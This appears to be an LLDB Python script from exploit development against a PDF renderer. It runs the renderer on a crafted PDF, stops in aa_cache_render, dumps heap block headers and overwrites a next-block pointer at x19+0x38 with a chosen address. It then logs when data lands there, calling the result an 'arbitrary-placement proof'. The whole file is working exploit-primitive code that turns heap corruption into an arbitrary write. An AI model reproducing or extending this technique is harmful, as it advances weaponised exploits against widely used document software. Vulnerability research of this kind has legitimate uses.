# RIP-20b: poison-to-arbitrary-write — link-scan + data-in-chosen-block proof.
import os, sys, struct, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
TRACE = open(os.path.join(CWD, "rip20_trace.txt"), "a")
def T(s): print(s); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()

def qwords(p, addr, n):
    m = p.ReadMemory(addr, n*8, err)
    if not err.Success() or not m: return None
    return [struct.unpack('<Q', m[i*8:i*8+8])[0] for i in range(n)]

def wr(p, addr, data):
    p.WriteMemory(addr, data, err)
    return err.Success()

def cleanup(bps):
    for b in bps:
        if b: t.BreakpointDelete(b.GetID())

def stop5():
    old = t.GetProcess()
    if old and old.IsValid() and old.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
        old.Kill(); time.sleep(0.2)
    bpe = t.BreakpointCreateByName("aa_cache_render")
    p = t.LaunchSimple(["k2_d31472.pdf", "r.png"], None, CWD)
    if not p or not p.IsValid(): return None, None, None, None
    th = p.GetSelectedThread()
    pc = th.GetSelectedFrame().GetPCAddress().GetLoadAddress(t)
    bpw = t.BreakpointCreateByAddress(pc + 1804)
    x19 = x27 = 0
    for i in range(5):
        p.Continue()
        st = p.GetState()
        while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
        if st != lldb.eStateStopped: break
        fr = p.GetSelectedThread().GetSelectedFrame()
        x19 = fr.FindRegister("x19").GetValueAsUnsigned()
        x27 = fr.FindRegister("x27").GetValueAsUnsigned()
        if x19: break
    return p, x19, x27, (bpe, bpw)

# P1: link-scan recon + block-header layout dump
p, x19, x27, bps = stop5()
if not p:
    T("P1 launchfail"); TRACE.close(); sys.exit(0)
T("P1 x19=%x x27=%x" % (x19, x27))
qs = qwords(p, x19, 64)
T("P1 x19 qwords: %s" % [hex(q) for q in (qs or [])])
nxt = qs[7] if qs and len(qs) > 7 else 0   # x19+0x38
if 0x100000000 <= nxt < 0x800000000000:
    hdr = qwords(p, nxt, 16)
    T("P1 block@(x19+0x38)=%x header: %s" % (nxt, [hex(q) for q in (hdr or [])]))
cleanup(bps); p.Kill()

# P3: poison x19+0x38 -> cloned-block at chosen address; sweep stops for pop
p, x19, x27, bps = stop5()
if not p or not x19:
    T("P3 nox19"); cleanup(bps); TRACE.close(); sys.exit(0)
qs = qwords(p, x19, 16)
orig_next = qs[7]
T("P3 x19=%x orig_next(+0x38)=%x" % (x19, orig_next))
blk = (x27 - 0x4000) + 0x100
# clone the original next-block header (0x100) into blk for plausibility
if 0x100000000 <= orig_next < 0x800000000000:
    hdr = p.ReadMemory(orig_next, 0x100, err)
    if err.Success() and hdr:
        wr(p, blk, hdr)
        T("P3 cloned header %x -> blk %x" % (orig_next, blk))
else:
    wr(p, blk, bytes(0x100))
wr(p, x19 + 0x38, struct.pack('<Q', blk))
T("P3 poison x19+0x38 -> blk=%x" % blk)
for b in bps:
    if b and b.GetID() != bps[1].GetID(): t.BreakpointDelete(b.GetID())
bps[1].SetOneShot(False)
landed = False
for stop in range(8):
    p.Continue()
    st = p.GetState()
    while st == lldb.eStateRunning: time.sleep(0.1); st = p.GetState()
    if st != lldb.eStateStopped:
        T("P3 exited at stop %d rc=%s" % (stop, p.GetExitStatus())); break
    data = p.ReadMemory(blk + 0x100, 0x80, err)  # body after cloned header
    if err.Success() and data:
        nz = sum(1 for b in data if b)
        if nz:
            T("P3 stop%d BLOCK-BODY nonzero=%d/128 first16=%s" % (stop, nz, data[:16].hex()))
            T("P3 DATA-IN-CHOSEN-BLOCK = ARBITRARY-PLACEMENT PROOF")
            landed = True
            break
        else:
            T("P3 stop%d body zero; slot now=%s" % (stop, hex(qwords(p, x19+0x38, 1)[0])))
    else:
        T("P3 stop%d read fail" % stop)
if not landed:
    T("P3 no pop observed in window")
p.Kill(); cleanup(bps)
T("RIP-20 DONE")
TRACE.close()
